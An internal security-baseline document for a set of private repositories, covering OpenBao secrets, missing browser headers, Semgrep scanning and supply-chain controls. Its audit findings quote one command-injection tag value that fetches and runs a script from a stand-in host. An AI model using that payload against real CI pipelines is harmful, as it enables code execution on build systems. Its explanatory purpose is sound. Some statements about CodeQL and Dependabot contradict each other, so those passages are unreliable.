# Security baseline

## Secrets

Every secret comes from OpenBao at boot, through `scripts/openbao-run.mjs`. The
wrapper fetches the app's secrets, asserts every key named in
`OPENBAO_REQUIRED_KEYS` is present, and refuses to start the process if one is
missing — a service that boots without a secret it needs fails later, in
production, in a way that looks like a bug.

Each app gets its own ACL policy granting read on exactly one `kv` path:

```hcl
path "kv/data/<app>"     { capabilities = ["read"] }
path "kv/metadata/<app>" { capabilities = ["read"] }
```

`scripts/provision-local-app-token.sh` in this repository writes the policy,
mints the token, verifies it can read the path, and installs it. Use it rather
than hand-rolling tokens — it distinguishes an expired token from a
wrongly-scoped one, which the raw error never does.

`notifications` still uses a shell `openbao-run.sh` where the others use the Node
wrapper. Same job, two implementations.

**Tokens expire.** Nothing currently warns before one lapses, and the resulting
boot failure reads like a misconfiguration. Until that alert exists, a lapsed
token is diagnosed by hand: a token that cannot look _itself_ up is expired, not
under-privileged.

## Browser surfaces

Every user-facing app sets security headers. **No repository currently sets
any** — four public Next.js apps and three HTTP APIs ship browser defaults.

Minimum, via `headers()` in `next.config` and `helmet` on each API:

- `Content-Security-Policy` — start in report-only, then enforce
- `Strict-Transport-Security`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `X-Frame-Options: DENY` or a CSP `frame-ancestors`

This is the cheapest unclaimed win in the estate: roughly half a day for all
four apps.

## Input and rate limits

Validate at every boundary — `ValidationPipe` with a DTO in Nest, a schema at
the edge elsewhere. Anything public and unauthenticated is rate limited.

`cv`'s contact form is rate limited with a process-local map, which is honest for
one container and useless across replicas. Treat it as a placeholder, not a
pattern.

## Code scanning

**Semgrep is the scanner. CodeQL is not, and cannot be.**

CodeQL code scanning on a _private_ repository requires GitHub Code Security
(formerly Advanced Security), a paid add-on. Every product repository here is
private, so the CodeQL workflows carry
`if: ${{ !github.event.repository.private }}` and have never run once. The
estate believed it had code scanning on five repositories and actually had it on
none — the one repository missing the gate was failing the job instead.

The CodeQL workflows are left in place, gated exactly as they are, so they start
working by themselves the day a repository goes public or the add-on is bought.
The `sast` job in each `ci.yml` is what actually scans:

- `semgrep scan`, not `semgrep ci` — the latter expects a Semgrep AppSec
  Platform token and behaves differently without one.
- `--error`, so a finding fails the build instead of printing quietly.
- Findings land in the job log. Uploading SARIF to the Security tab needs the
  same paid add-on, so the log is the report.

Rules are excluded only with a reason written beside them in the workflow.
Anything excluded as a false positive was read first; anything excluded as
backlog is in `adoption.md`.

### What the first run found

Turning it on was not a formality. On the first scan of the estate:

- **Script injection in four deploy workflows.**
  `raw_tag="${{ github.event.release.tag_name }}"` inside a `run:` block. The
  expression is substituted into the script _text_ before bash starts, so a tag
  named `v1"; curl evil.sh | sh; x="` executes — and the `tr` sanitisation two
  lines below runs far too late to help. Fixed by passing the value through
  `env:`, where it is data whatever it contains.
- **TLS without verification.** kini's database connection used
  `ssl: { rejectUnauthorized: false }` — encryption without authentication,
  which stops passive sniffing but not an active man-in-the-middle. Verification
  is now on by default with an explicit, named opt-out and a slot for the CA.
- **Every third-party action pinned to a mutable tag.** `gitleaks-action@v2`,
  `codeql-action@v4` and eight others, while `actions/checkout` and
  `setup-node` were already pinned by SHA. A tag can be silently repointed by
  its owner; that is how the `tj-actions/changed-files` and `trivy-action`
  compromises worked. All ten are now pinned to full commit SHAs.
- **Dependabot with no cooldown**, so a compromised release could be proposed
  within hours of publication. Every ecosystem entry in all seven repositories
  now waits seven days.

## Supply chain

| Control               | Runs                            |
| --------------------- | ------------------------------- |
| Gitleaks              | pre-commit and CI, over history |
| CodeQL                | CI, on push and PR              |
| `npm audit` prod gate | CI, high and above fails        |
| Trivy                 | CI, against the built image     |
| SBOM                  | CI, uploaded per release        |
| Dependabot            | weekly, grouped                 |

**No repository has Dependabot or Renovate.** Every dependency update in the
estate is manual, which means a published CVE sits unpatched until someone
happens to run an audit. One config file per repository closes it.

`trading-bot` and `notifications` have neither Gitleaks nor CodeQL.

## What is deliberately not here

Image signing, SLSA provenance and licence scanning are worth doing and are not
required yet. They are in the phased plan rather than the baseline, because a
standard nobody can meet teaches people to ignore the standard.
